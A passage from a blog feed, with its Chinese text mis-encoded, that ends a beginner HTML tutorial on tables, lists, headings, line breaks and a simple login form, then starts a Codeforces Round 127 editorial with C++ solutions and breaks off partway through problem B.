alt="5"></p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥å†™ä¸€ä¸ªä»£ç æ¥å¼•ç”¨ç«™å¤–å›¾ç‰‡</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://codeforces.org/s/14146/images/codeforces-logo-with-telegram.png&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸå¼•ç”¨ <code>codeforces</code> çš„ <code>logo</code>ã€‚</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/6.png" alt="6"></p><h4 id="tr-td"><a href="#tr-td" class="headerlink" title="tr,td"></a>tr,td</h4><p>è¿™ä¸ªæˆ‘ä¹Ÿè¿˜åœ¨æ‘¸ç´¢ï¼Œä¸è¿‡ç»è¿‡æˆ‘è‡ªå·±çš„æµ‹è¯•å¤§æ¦‚èƒ½è®²å‡ºä¸€äºŒï¼Œ<code>tr</code> ä¸ºä¸€è¡Œï¼Œç„¶å <code>td</code> ä¸ºä¸€è¡Œä¸­çš„ä¸€åˆ—æ ‡ç­¾ã€‚ ç”¨æ•°æ®åº“çš„æœ¯è¯­æ¥è¯´å‘¢ï¼Œå°±æ˜¯ï¼š<code>&lt;tr&gt;</code> æ ‡ç­¾ä¸ºä¸€æ¡æ•´è®°å½•ï¼Œ <code>&lt;td&gt;</code> æ ‡ç­¾ä¸ºä¸€æ¡è®°å½•çš„å…¶ä¸­ä¸€ä¸ªå­—æ®µçš„å€¼ã€‚</p><p>æˆ‘ä»¬ä¹Ÿå†™ä¸€ä¸ªdemo</p><h5 id="demo-2"><a href="#demo-2" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                        aaaaaaaaaaaaa</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                        bbbbbbbb</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                        cccccc</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                        ddd</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ•ˆæœå¦‚ä¸‹</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/7.png" alt="7"></p><h4 id="ul-ol"><a href="#ul-ol" class="headerlink" title="ul,ol"></a>ul,ol</h4><p>è¿™ä¿©æ˜¯æ— åºåˆ—è¡¨å’Œæœ‰åºåˆ—è¡¨ï¼Œç»å¸¸ç”¨ <code>markdown</code> å†™åšå®¢çš„å¸ˆå‚…å¯¹è¿™ä¸ªåº”è¯¥ä¸ä¼šå¾ˆé™Œç”Ÿï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹æ•ˆæœä»¥åŠå·®å¼‚å³å¯ã€‚</p><h5 id="demo-3"><a href="#demo-3" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>bbb<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>ddd<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>eee<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>fff<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>ggg<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>hhh<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/8.png" alt="8"></p><p>å°†ä»£ç ä¸­çš„ <code>ul</code> æ¢æˆ <code>ol</code> ä¹‹åå‘¢ï¼Œæ•ˆæœæ˜¯è¿™æ ·çš„</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/9.png" alt="9"></p><h4 id="h1-h6"><a href="#h1-h6" class="headerlink" title="h1-h6"></a>h1-h6</h4><p>1-6çº§çš„æ ‡é¢˜ã€‚</p><h5 id="demo-4"><a href="#demo-4" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>è¿™æ˜¯ä¸€çº§æ ‡é¢˜<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>è¿™æ˜¯äºŒçº§æ ‡é¢˜<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>è¿™æ˜¯ä¸‰çº§æ ‡é¢˜<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h4</span>&gt;</span>è¿™æ˜¯å››çº§æ ‡é¢˜<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h5</span>&gt;</span>è¿™æ˜¯äº”çº§æ ‡é¢˜<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h6</span>&gt;</span>è¿™æ˜¯å…­çº§æ ‡é¢˜<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/10.png" alt="10"></p><h4 id="br"><a href="#br" class="headerlink" title="br"></a>br</h4><p>æ¢è¡Œæ ‡ç­¾ï¼Œå°±è·Ÿæˆ‘ä»¬ <code>C</code> é‡Œé¢çš„ <code>\n</code> ä¸€æ ·ä¸€æ ·çš„ã€‚</p><h5 id="demo-5"><a href="#demo-5" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            è¿™æ˜¯ç¬¬ä¸€è¡Œ</span><br><span class="line">            å¦‚æœæ²¡æœ‰åŠ bræ ‡ç­¾ï¼Œè¿™é‡Œè¿˜æ˜¯ç¬¬ä¸€è¡Œ<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">            å‰é¢åŠ äº†bræ ‡ç­¾ï¼Œå› æ­¤è¿™é‡Œå¼€å§‹æ˜¯ç¬¬äºŒè¡Œ</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼Œè¿™ä¸ªdemoä¹Ÿæ˜¯å……åˆ†å±•ç°äº†ï¼Œä»£ç é‡Œæ¢è¡Œä»…ä»…åªæ˜¯ä¸ºäº†å¥½çœ‹ï¼ŒçœŸçš„è¦æ¢è¡Œè¿˜å¾—è¿™ä¸ªæ ‡ç­¾å‡ºé©¬ã€‚</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/11.png" alt="11"></p><p>åˆ°è¿™é‡Œï¼Œå¸¸ç”¨çš„æ ‡ç­¾å°±è®²å®Œäº†ã€‚</p><h3 id="inputæ ‡ç­¾"><a href="#inputæ ‡ç­¾" class="headerlink" title="inputæ ‡ç­¾"></a>inputæ ‡ç­¾</h3><p>è¿™ä¸ªå…¶å®ä¹Ÿç®—æ˜¯éå¸¸å¸¸è§çš„æ ‡ç­¾äº†ï¼Œåªä¸è¿‡å®ƒæœ‰ç‚¹å°å¤æ‚ï¼Œå› æ­¤å•ç‹¬æ‹å‡ºæ¥è®²è®²ã€‚</p><p>è¿™ä¸ªä¸»è¦ç”¨äºæ”¶é›†è¡¨å•ç”¨çš„æ§ä»¶ï¼Œä½¿ç”¨ <code>type</code> å±æ€§æŒ‡å®šå®ƒå…·ä½“æ˜¯å“ªä¸€ç±»æ§ä»¶ï¼Œè¿™äº›æ§ä»¶é€šå¸¸ä¼šåœ¨ <code>form</code> æ ‡ç­¾å†…ï¼ŒæŒ‡å®š <code>form</code> æ ‡ç­¾æäº¤æ–¹å¼ï¼Œå½“ç‚¹å‡»æäº¤æ—¶ä¾¿ä¼šå°†è¿™ä¸ª <code>form</code> æ ‡ç­¾ä¸Šæ‰€æœ‰çš„ç”¨æˆ·è¾“å…¥æäº¤åˆ°åç«¯å»ã€‚åªæ˜¯æˆ‘ä»¬æ²¡æœ‰åœ¨åç«¯å†™è„šæœ¬å“åº”è¿™äº›æ•°æ®ï¼Œå› æ­¤æˆ‘ä»¬è‡ªå·±å°è¯•çš„è¯ç‚¹å‡»é€šå¸¸æ˜¯æ— æ•ˆçš„ã€‚</p><p>å¸¸ç”¨çš„æ§ä»¶æœ‰ä»¥ä¸‹å‡ ç§</p><ul><li><code>text</code>ï¼šæ™®é€šæ–‡æœ¬æ¡†</li><li><code>password</code>ï¼šå¯†ç æ¡†ï¼Œä¸æ–‡æœ¬æ¡†ä¸€æ ·åªæ˜¯è¾“å…¥å†…å®¹ä¼šè¢«å’Œè°</li><li><code>textarea</code>ï¼šå¤šè¡Œæ–‡æœ¬æ¡†</li><li><code>submit</code>ï¼šæäº¤æŒ‰é’®</li><li><code>radio</code>ï¼šå•é€‰æ¡†</li><li><code>checkbox</code>ï¼šå¤é€‰æ¡†</li><li><code>select</code>ï¼šä¸‹æ‹‰æ¡†</li></ul><p>è¿™ä¸ªæˆ‘ä»¬ä¸ä¸€ä¸€è®²è§£äº†ï¼Œç›´æ¥ä¸€èµ·èšåˆèµ·æ¥è¯•è¯•å§ã€‚</p><p>æˆ‘ä»¬å¤åˆ»ä¸€ä¸ªæœ€åŸºæœ¬çš„ç™»å½•å‰ç«¯</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">                ç”¨æˆ·å<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">                å¯†ç <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">                èº«ä»½ï¼š<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;user&quot;</span>/&gt;</span>ç®¡ç†å‘˜</span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span>/&gt;</span>ç”¨æˆ·</span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;guest&quot;</span>&gt;</span>æ¸¸å®¢<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;login&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;keep&quot;</span> <span class="attr">value</span>=<span class="string">&quot;remember&quot;</span>&gt;</span>è®°ä½å¯†ç </span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/12.png" alt="12"></p><p>å¯ä»¥å‘ç° <code>input</code> æ ‡ç­¾éƒ½è®¾ç½®äº†ä¸‰ä¸ªå€¼ï¼Œç¬¬ä¸€ä¸ªæˆ‘ä»¬è¯´è¿‡äº†æŒ‡å®šæ§ä»¶ç±»å‹ï¼Œç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªæ˜¯ä»€ä¹ˆå‘¢ã€‚</p><p><code>name</code>å…¶å®å°±æ˜¯å‚æ•°åï¼Œè¿™ä¸ª<code>value</code>å‘¢å°±æ˜¯å‚æ•°å€¼äº†ï¼Œ<code>form</code> æ ‡ç­¾æœ‰ä¸€ä¸ªå±æ€§æŒ‡å®šçš„æ˜¯æäº¤è¡¨å•çš„æ–¹å¼ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šé»˜è®¤ä»¥ <code>get</code> æ–¹å¼æäº¤ï¼Œ<code>get</code> æ–¹å¼æˆ‘ä»¬å¾ˆæ¸…æ¥šä¸€ç‚¹å°±æ˜¯æ•°æ®åœ¨ <code>url</code> ä¸­éƒ½æ˜¯å¯ä»¥çœ‹åˆ°çš„çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬éšä¾¿è¾“å…¥ç‚¹å‡»æäº¤çœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆã€‚</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/13.png" alt="13"></p><p>ä» <code>url</code> ä¸­ä¹Ÿèƒ½å¾ˆæ¸…æ¥šçš„çœ‹åˆ°åˆšåˆšè¯´çš„è¿™ä¸€ç‚¹ï¼Œåªæ˜¯è¿™ç§æäº¤æ–¹å¼å·²ç»å¾ˆå°‘è§äº†ï¼Œå¤§å®¶ä¹Ÿèƒ½çœ‹åˆ°ï¼Œè¾“å…¥çš„æ•°æ®åŸºæœ¬å°±æ˜¯æ˜æ–‡ä¼ è¾“çš„ï¼Œç°åœ¨ç½‘ç»œå®‰å…¨ä¹Ÿæ˜¯å›½å®¶é«˜åº¦é‡è§†çš„ï¼Œç¨å¾®å¤§ä¸€ç‚¹çš„ç½‘ç«™åŸºæœ¬éƒ½æ˜¯è‡ªå·±å†™æäº¤æ–¹æ³•ç„¶åç„¶å <code>js</code> ç»‘å®šæ§ä»¶å»æ‰§è¡Œäº‹ä»¶ï¼Œè¿™æ ·å°±èƒ½åœ¨ <code>js</code> é‡Œå†™åŠ è§£å¯†æ–¹æ³•äº†ã€‚</p><p>å°±è¿™ä¹ˆå¤šå§ï¼Œhtmlå­¦åˆ°è¿™é‡Œå·®ä¸å¤šèƒ½å¼„æ¸…æ¥šä¸€ç‚¹äº†ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ¥å­¦å­¦ &lt;code&gt;html&lt;/code&gt; (è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€)ã€‚&lt;/p&gt;
&lt;p&gt;è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€)æ˜¯ä¸€ç§ç”¨äºåˆ›å»ºç½‘é¡µçš„æ ‡å‡†æ ‡è®°è¯­è¨€ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="web" scheme="http://example.com/categories/ctf/web/"/>
    
    <category term="html" scheme="http://example.com/categories/ctf/web/html/"/>
    
    
  </entry>
  
  <entry>
    <title>educational codeforces round 127(Div.2)</title>
    <link href="http://example.com/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/"/>
    <id>http://example.com/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/</id>
    <published>2022-04-23T15:00:00.000Z</published>
    <updated>2022-07-23T11:43:56.265Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1671">Educational Codeforces Round 127 (Rated for Div. 2)</a>ï¼Œå’•äº†æœ‰ç‚¹ä¹…äº†ï¼Œç°åœ¨å¼€å†™é¢˜è§£ã€‚</p><span id="more"></span><h2 id="A-String-Building"><a href="#A-String-Building" class="headerlink" title="A. String Building"></a>A. String Building</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>åˆ†æå­—ç¬¦ä¸²æ˜¯å¦èƒ½ç”±aa,aaa,bb,bbbç»„æˆï¼Œç»™å®šå­—ç¬¦ä¸²åªå«æœ‰aå’Œbï¼Œå¾ˆç®€å•ï¼Œå°±çœ‹çœ‹æœ‰æ²¡æœ‰å•ç‹¬å­˜åœ¨çš„aæˆ–è€…bå³å¯</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100005</span>]; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    s[len++]=<span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==s[i<span class="number">-1</span>])&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(ans==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            ans=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Consecutive-Points-Segment"><a href="#B-Consecutive-Points-Segment" class="headerlink" title="B. Consecutive Points Segment"></a>B. Consecutive Points Segment</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>åœ¨æ•°è½´ä¸Šæ”¾è‹¥å¹²ä¸ªç‚¹ï¼Œæ¯ä¸ªç‚¹å¯ä»¥å·¦ç§»æˆ–è€…å³ç§»ä¸€ä¸ªå•ä½ï¼Œæˆ–è€…ä¸ç§»ï¼Œåˆ¤æ–­æœ€åæ‰€æœ‰ç‚¹èƒ½å¦åœ¨æ•´æ•°é›†åˆå†…è¿ç»­ã€‚åªè€ƒè™‘æœ€å·¦è¾¹å’Œæœ€å³è¾¹çš„ç‚¹ï¼Œä¸éš¾å‘ç°ï¼Œè‹¥èƒ½è¿ç»­ï¼Œåˆ™æ»¡è¶³a[n]-a[1]=n-1ï¼Œæˆ‘ä»¬å°±çœ‹æœ€å¤–ä¸¤ä¸ªç‚¹èƒ½å¦è¾¾åˆ°è¿™ä¸ªçº¦æŸã€‚è‹¥å·¦è¾¹ç‚¹å³ç§»ï¼Œå³è¾¹ç‚¹å·¦ç§»åˆ™å¯ä»¥ä½¿å¾—é—´è·ç¼©å°2ï¼Œå› æ­¤è‹¥åŸæœ¬è·ç¦»è¶…è¿‡äº†n+1åˆ™ä¸€å®šä¸è¡Œã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 